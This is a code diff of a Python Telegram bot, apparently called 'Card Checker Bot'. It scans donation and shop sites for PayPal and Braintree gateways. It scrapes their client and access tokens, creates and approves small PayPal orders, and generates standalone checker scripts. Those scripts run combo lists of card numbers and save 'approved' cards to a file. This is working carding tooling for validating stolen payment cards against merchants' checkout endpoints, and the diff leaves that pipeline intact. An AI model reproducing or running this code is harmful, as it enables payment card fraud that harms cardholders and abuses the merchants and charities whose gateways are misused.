             match = re.search(pattern, html, re.IGNORECASE)
@@ -908,32 +568,6 @@ class PayPalRequestChecker:
                     pass
                 self.client_token = enc
                 return
-        
-        direct_patterns = [
-            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
-            r'"accessToken"\s*:\s*"([^"]+)"',
-            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
-            r'accessToken=([^&\s"\']+)',
-        ]
-        for pattern in direct_patterns:
-            match = re.search(pattern, html, re.IGNORECASE)
-            if match:
-                self.access_token = match.group(1)
-                return
-    
-    def _extract_site_type(self, html):
-        if 'wp-content/plugins/give' in html:
-            self.site_type = "givewp"
-        elif 'wp-content/plugins/woocommerce' in html:
-            self.site_type = "woocommerce"
-        elif 'paypal' in html.lower() and 'donate' in html.lower():
-            self.site_type = "donation"
-        elif 'stripe' in html.lower():
-            self.site_type = "stripe"
-        elif 'braintree' in html.lower():
-            self.site_type = "braintree"
-        else:
-            self.site_type = "unknown"
     
     def _try_all_token_methods(self):
         if self.access_token:
@@ -978,9 +612,6 @@ class PayPalRequestChecker:
             'give_paypal_commerce_get_client_token',
             'get_client_token',
             'paypal_get_client_token',
-            'give_paypal_get_client_token',
-            'ppcp_get_client_token',
-            'wc_ppcp_get_client_token',
         ]
         for action in actions:
             try:
@@ -998,15 +629,9 @@ class PayPalRequestChecker:
                     token = None
                     if 'data' in json_data:
                         if isinstance(json_data['data'], dict):
-                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
+                            token = json_data['data'].get('client_token') or json_data['data'].get('token')
                         elif isinstance(json_data['data'], str):
                             token = json_data['data']
-                    elif 'client_token' in json_data:
-                        token = json_data['client_token']
-                    elif 'token' in json_data:
-                        token = json_data['token']
-                    elif 'access_token' in json_data:
-                        token = json_data['access_token']
                     
                     if token:
                         if '.' not in token:
@@ -1045,9 +670,8 @@ class PayPalRequestChecker:
         }
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
         for action in actions:
-            params = {'action': action}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                response = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -1107,11 +731,10 @@ class PayPalRequestChecker:
             'referer': f'https://{self.url}{self.inurl}',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         }
-        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
+        actions = ['give_paypal_commerce_approve_order', 'give_approve_order']
         for action in actions:
-            params = {'action': action, 'order': order_id}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                response = self.r.post(self.ajax_url, params={'action': action, 'order': order_id}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200:
                     return response
             except:
@@ -1193,8 +816,6 @@ class PayPalRequestChecker:
                 text = approve_res.text
                 for keyword in LIVE_RESPONSES:
                     if keyword.upper() in text.upper():
-                        if keyword == 'ORDER_NOT_APPROVED':
-                            return "Payer cannot pay for this transaction."
                         return keyword
                 if 'true' in text.lower():
                     return "CHARGE 1.0"
@@ -1202,21 +823,17 @@ class PayPalRequestChecker:
             return "DECLINED"
         except Exception as e:
             return f"Error: {str(e)[:100]}"
-            
-            # ═══ Check Single Link Functions ═══
+
+
+# ═══ Check Functions ═══
 def check_single_link_with_browser(link):
-    """فحص بـ Playwright - يرجع الرد الحقيقي من الموقع"""
     try:
         if not link.startswith(("http://", "https://")):
             return {'link': link, 'live': False, 'respons': 'Invalid URL'}
         
         if HAS_PLAYWRIGHT:
             browser = PayPalBrowserAutomation(link, headless=True)
-            result = browser.run(
-                card_number=TEST_CARD_NUMBER,
-                expiry=TEST_CARD_EXPIRY,
-                cvc=TEST_CARD_CVC
-            )
+            result = browser.run()
             
             is_live = False
             for pr in LIVE_RESPONSES:
@@ -1228,9 +845,6 @@ def check_single_link_with_browser(link):
                 'link': link,
                 'live': is_live,
                 'respons': result,
-                'tokens': browser.tokens,
-                'form_data': browser.form_data,
-                'html': browser.html[:5000],
                 'method': 'playwright'
             }
         else:
@@ -1239,7 +853,6 @@ def check_single_link_with_browser(link):
         return {'link': link, 'live': False, 'respons': f'Error: {str(e)[:100]}'}
 
 def check_single_link_request(link):
-    """فحص عادي (request-based) - للـ Mass"""
     paypal = None
     try:
         if not link.startswith(("http://", "https://")):
@@ -1270,7 +883,6 @@ def check_single_link_request(link):
             'cookies': paypal.cookies,
             'url': paypal.url,
             'inurl': paypal.inurl,
-            'site_type': paypal.site_type,
             'method': 'request'
         }
     except Exception as e:
@@ -1281,6 +893,7 @@ def check_single_link_request(link):
                 paypal.r.close()
             except:
                 pass
+
 
 # ═══ Generate Gateway Code ═══
 def generate_gateway_code(result):
@@ -1295,7 +908,6 @@ def generate_gateway_code(result):
     
     return f'''import requests, re, random, time, base64, uuid
 from fake_useragent import UserAgent
-from urllib.parse import urlparse
 
 class PayPal:
     def __init__(self):
@@ -1477,7 +1089,7 @@ class PayPal:
         return None
 
 if __name__ == '__main__':
-    Getat = 'PayPal Playwright 1$'
+    Getat = 'PayPal 1$'
     print(f'Cheker {{Getat}}')
     Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
     if Br == '1':
@@ -1504,17 +1116,21 @@ if __name__ == '__main__':
                     resulti = f'Error {{e}}'
                 if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                     with open('Approved Card.txt', "a") as f:
-                        f.write(P + ': {{resulti}} > {{Getat}}')
+                        f.write(P + ': {{resulti}} > {{GTG}}')
                 print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                 time.sleep(13)'''
 
-# ═══ Bot Commands ═══
+
+# ═══════════════════════════════════════════════════════════
+# ═══ BOT COMMANDS ═══
+# ═══════════════════════════════════════════════════════════
+
 @bot.message_handler(commands=["start"])
 def start(message):
     with open("blockusers.txt", "r") as file:
         blocked = file.read().splitlines()
     if str(message.from_user.id) in blocked:
-        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
+        safe_send_message(message.chat.id, '🚫 You are blocked.')
         return
     
     user_id = message.from_user.id
@@ -1529,76 +1145,20 @@ def start(message):
 ━━━━━━━━━━━━━━━━━━━━
 💎 <b>PayPal Gateway</b> → /paypal
 💰 <b>Mass Extract</b> → /mass
-📨 <b>Send Feedback</b> → Button Below
 ━━━━━━━━━━━━━━━━━━━━
 ⚡ <b>Dev:</b> @FAWZY30'''
     
-    FRA = types.InlineKeyboardMarkup(row_width=2)
-    Yes22 = types.InlineKeyboardButton('📨 Submit Feedback', callback_data='yrr')
-    FRA.add(Yes22)
-    
-    safe_send_message(message.chat.id, IU, reply_markup=FRA)
+    safe_send_message(message.chat.id, IU)
 
-@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
-def feedback(call):
-    user_id = call.from_user.id
-    userr = call.from_user.first_name
-    Atty = types.InlineKeyboardMarkup(row_width=1)
-    back = types.InlineKeyboardButton("🔙 Back", callback_data="start")
-    Atty.add(back)
-    YTT = f'📨 Welcome {userr}\n\nSend your message and the admin will respond.'
-    try:
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
-    except:
-        pass
-    waiting_users[user_id] = True
-
-@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
-def get_user_msg(message):
-    user_id = message.from_user.id
-    name = message.from_user.first_name
-    kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user_id}"))
-    safe_send_message(OWNER_ID, f"📨 <b>New Message</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>From:</b> {name}\n🆔 <b>ID:</b> {user_id}\n💬 <b>Message:</b> {message.text}", reply_markup=kb)
-    safe_send_message(user_id, "✅ Your message has been sent.")
-    waiting_users.pop(user_id)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
-def start_reply(call):
-    user_id = int(call.data.split("_")[1])
-    reply_mode[call.from_user.id] = user_id
-    safe_send_message(call.from_user.id, "✍️ Write your reply now:")
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
-def send_reply(message):
-    user_id = reply_mode[message.from_user.id]
-    safe_send_message(user_id, f"👨‍💻 <b>Admin response:</b>\n\n{message.text}")
-    safe_send_message(OWNER_ID, "✅ Reply sent.")
-    reply_mode.pop(message.from_user.id)
-
-@bot.callback_query_handler(func=lambda call: call.data == "start")
-def back_to_start(call):
-    user_id = call.from_user.id
-    userr = call.from_user.first_name
-    username = call.from_user.username or "No Username"
-    IU = f'🚀 <b>Welcome To Card Checker Bot</b> 🌟\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> {userr}\n📛 <b>Username:</b> @{username}\n🆔 <b>ID:</b> <code>{user_id}</code>'
-    FRA = types.InlineKeyboardMarkup(row_width=2)
-    Yes22 = types.InlineKeyboardButton('📨 Submit Feedback', callback_data='yrr')
-    FRA.add(Yes22)
-    try:
-        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
-    except:
-        pass
-
-@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
+@bot.message_handler(commands=['paypal'])
 def check_paypal(message):
     with open("blockusers.txt", "r") as file:
         blocked = file.read().splitlines()
     if str(message.from_user.id) in blocked:
-        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
+        safe_send_message(message.chat.id, '🚫 You are blocked.')
         return
     
-    ko = safe_send_message(message.chat.id, "🔍 <b>Scanning Gateway with Browser Automation...</b>")
+    ko = safe_send_message(message.chat.id, "🔍 <b>Scanning...</b>")
     if not ko:
         return
     
@@ -1613,8 +1173,6 @@ def check_paypal(message):
             safe_edit_message(message.chat.id, ko.message_id, "❌ <b>Invalid link format</b>")
             return
         
-        safe_edit_message(message.chat.id, ko.message_id, "✅ <b>Gateway found! Opening browser...</b>")
-        
         result = check_single_link_with_browser(link)
         
         if result['live']:
@@ -1627,7 +1185,6 @@ def check_paypal(message):
 ━━━━━━━━━━━━━━━━━━━━
 🔗 <b>Link:</b> <code>{link}</code>
 💬 <b>Response:</b> <code>{result['respons']}</code>
-🛠️ <b>Method:</b> <code>{result.get('method', 'playwright')}</code>
 ━━━━━━━━━━━━━━━━━━━━
 ⚡ <b>Dev:</b> @FAWZY30'''
             
@@ -1637,7 +1194,7 @@ def check_paypal(message):
             except:
                 pass
         else:
-            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Dead Gateway</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 <b>Link:</b> <code>{link}</code>\n📝 <b>Response:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\n⚡ <b>Dev:</b> @FAWZY30")
+            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Dead</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 <code>{link}</code>\n📝 <b>Response:</b> <code>{result['respons']}</code>")
     
     except Exception as e:
         safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Error:</b> {str(e)[:100]}")
@@ -1647,10 +1204,10 @@ def mass_extract_start(message):
     with open("blockusers.txt", "r") as file:
         blocked = file.read().splitlines()
     if str(message.from_user.id) in blocked:
-        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
+        safe_send_message(message.chat.id, '🚫 You are blocked.')
         return
     
-    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
+    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links:")
     if msg:
         bot.register_next_step_handler(msg, process_mass_file)
 
@@ -1669,7 +1226,6 @@ def process_mass_file(message):
         return
     
     try:
-        # Sticker
         try:
             bot.send_sticker(message.chat.id, STICKER_FILE_ID)
         except:
@@ -1702,16 +1258,9 @@ def process_mass_file(message):
             'stop_flag': False, 'done': False
         }
         
-        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>
-━━━━━━━━━━━━━━━━━━
-📌 <b>Total Links:</b> {total}
-✅ <b>Live:</b> 0
-❌ <b>Dead:</b> 0
-⏳ <b>Progress:</b> 0% ░░░░░░░░░░░░░░░░░░░░
-🔗 <b>Url:</b> ...
-💬 <b>Respons:</b> ...
-━━━━━━━━━━━━━━━━━━
-⏱️ <b>Checked:</b> 0 of {total}
+        status_msg = safe_send_message(chat_id, f"""📊 <b>Scanning...</b>
+📌 Total: {total} | ✅ Live: 0 | ❌ Dead: 0
+⏳ 0% ░░░░░░░░░░
 🛑 /stop to stop""")
         
         if not status_msg:
@@ -1720,7 +1269,7 @@ def process_mass_file(message):
         def update_status():
             last_text = ""
             while True:
-                time.sleep(10)
+                time.sleep(8)
                 try:
                     with processing_status[user_id]['lock']:
                         if processing_status[user_id].get('done', False):
@@ -1731,23 +1280,18 @@ def process_mass_file(message):
                         current_url = processing_status[user_id]['current_url']
                         current_respons = processing_status[user_id]['current_respons']
                         percent = int((processed / total) * 100) if total > 0 else 0
-                        bar_length = 20
+                        bar_length = 15
                         filled = int((percent / 100) * bar_length)
                         bar = '█' * filled + '░' * (bar_length - filled)
-                        text = f"""📊 <b>File #1 - Scanning links...</b>
-━━━━━━━━━━━━━━━━━━
-📌 <b>Total Links:</b> {total}
-✅ <b>Live:</b> {live}
-❌ <b>Dead:</b> {dead}
-⏳ <b>Progress:</b> {percent}% {bar}
-🔗 <b>Url:</b> <code>{current_url[:60] if current_url else '...'}</code>
-💬 <b>Respons:</b> <code>{current_respons[:60] if current_respons else '...'}</code>
-━━━━━━━━━━━━━━━━━━
-⏱️ <b>Checked:</b> {processed} of {total}
+                        text = f"""📊 <b>Scanning...</b>
+📌 Total: {total} | ✅ Live: {live} | ❌ Dead: {dead}
+⏳ {percent}% {bar}
+🔗 <code>{current_url[:50] if current_url else '...'}</code>
+💬 <code>{current_respons[:50] if current_respons else '...'}</code>
 🛑 /stop to stop"""
                         if text != last_text:
                             try:
-                                bot.edit_message_text(premium_emoji(text), chat_id, status_msg.message_id, parse_mode="HTML")
+                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                 last_text = text
                             except:
                                 pass
@@ -1782,12 +1326,9 @@ def process_mass_file(message):
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
                         
-                        caption = f"""💎 <b>Live Gateway #{live_idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 <b>Link:</b> <code>{result['link']}</code>
-💬 <b>Respons:</b> <code>{result['respons']}</code>
-━━━━━━━━━━━━━━━━━━━━
-⚡ <b>Dev:</b> @FAWZY30"""
+                        caption = f"""💎 <b>Live #{live_idx}</b>
+🔗 <code>{result['link']}</code>
+💬 <code>{result['respons']}</code>"""
                         
                         safe_send_document(chat_id, file_name, caption=caption)
                         try:
@@ -1796,13 +1337,10 @@ def process_mass_file(message):
                             pass
                         time.sleep(1)
                     except Exception as e:
-                        print(f"Error sending file: {e}")
+                        print(f"Error: {e}")
                 else:
                     processing_status[user_id]['dead'] += 1
                     processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
-            
-            if idx % 5 == 0:
-                time.sleep(0.5)
             
             if idx % 50 == 0 and idx > 0:
                 gc.collect()
@@ -1816,13 +1354,8 @@ def process_mass_file(message):
         updater.join(timeout=3)
         
         final_text = f"""📊 <b>✅ Complete!</b>
-━━━━━━━━━━━━━━━━━━
-📌 <b>Total Links:</b> {total}
-✅ <b>Live (Sent):</b> {live}
-❌ <b>Dead:</b> {dead}
-💯 <b>Success Rate:</b> {int((live/total)*100) if total > 0 else 0}%
-━━━━━━━━━━━━━━━━━━
-⚡ <b>Dev:</b> @FAWZY30"""
+📌 Total: {total} | ✅ Live: {live} | ❌ Dead: {dead}
+💯 Success: {int((live/total)*100) if total > 0 else 0}%"""
         
         try:
             safe_edit_message(chat_id, status_msg.message_id, final_text)
@@ -1840,20 +1373,20 @@ def process_mass_file(message):
 @bot.message_handler(commands=['block2'])
 def block_user(message):
     if str(message.from_user.id) not in admins:
-        safe_send_message(message.chat.id, "⛔ <b>You do not have permission.</b>")
+        safe_send_message(message.chat.id, "⛔ No permission.")
         return
     try:
         user_id_to_block = message.text.split()[1]
         with open('blockusers.txt', 'a') as file:
             file.write(f"{user_id_to_block}\n")
-        safe_send_message(message.chat.id, f"✅ <b>User ID {user_id_to_block} blocked.</b>")
+        safe_send_message(message.chat.id, f"✅ {user_id_to_block} blocked.")
     except:
-        safe_send_message(message.chat.id, "📝 <b>Usage:</b> /block2 [user_id]")
+        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")
 
 @bot.message_handler(commands=['unblock2'])
 def unblock_user(message):
     if str(message.from_user.id) not in admins:
-        safe_send_message(message.chat.id, "⛔ <b>You do not have permission.</b>")
+        safe_send_message(message.chat.id, "⛔ No permission.")
         return
     try:
         user_id_to_unblock = message.text.split()[1]
@@ -1863,34 +1396,42 @@ def unblock_user(message):
             for line in lines:
                 if line.strip() != user_id_to_unblock:
                     file.write(line)
-        safe_send_message(message.chat.id, f"✅ <b>User ID {user_id_to_unblock} unblocked.</b>")
+        safe_send_message(message.chat.id, f"✅ {user_id_to_unblock} unblocked.")
     except:
-        safe_send_message(message.chat.id, "📝 <b>Usage:</b> /unblock2 [user_id]")
+        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")
 
 # ═══ Run ═══
 print('🚀 Bot is running...')
 
 if __name__ == '__main__':
+    # حذف Webhook
+    try:
+        bot.delete_webhook(drop_pending_updates=True)
+        print("✅ Webhook deleted")
+        time.sleep(2)
+    except Exception as e:
+        print(f"⚠️ Webhook error: {e}")
+    
+    # تشغيل البوت
     while True:
         try:
             print("🔄 Starting bot polling...")
-            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
+            bot.infinity_polling(timeout=30, long_polling_timeout=30)
         except KeyboardInterrupt:
-            print('🛑 Bot stopped by user')
+            print('🛑 Bot stopped')
             break
         except Exception as e:
             error_str = str(e)
-            if "502" in error_str or "Bad Gateway" in error_str:
+            if "409" in error_str:
+                print("⚠️ 409 - Another instance. Waiting 30s...")
+                time.sleep(30)
+            elif "502" in error_str:
                 time.sleep(10)
-            elif "409" in error_str:
-                time.sleep(15)
             elif "429" in error_str:
                 time.sleep(30)
             elif "timeout" in error_str.lower():
                 time.sleep(5)
             elif "Connection" in error_str:
                 time.sleep(5)
-            elif "500" in error_str:
-                time.sleep(10)
             else:
                 time.sleep(5)
